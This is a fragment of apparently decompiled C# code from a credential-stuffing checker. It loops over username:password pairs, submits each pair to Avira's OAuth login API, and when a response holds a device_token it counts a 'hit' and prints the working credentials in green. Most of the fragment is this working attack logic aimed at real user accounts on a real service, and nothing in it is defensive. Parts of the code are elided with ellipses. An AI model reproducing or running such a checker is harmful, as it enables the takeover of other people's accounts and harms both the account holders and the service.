        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str1 = "{\"grant_type\":\"password\",\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://api.my.avira.com/v2/oauth/", str1, "application/json").ToString();
              if (!str2.Contains("invalid_credentials"))
              {
                if (str2.Contains("device_token"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - AVIRA] " + s[0] + ":" + s[1], Color.Green);
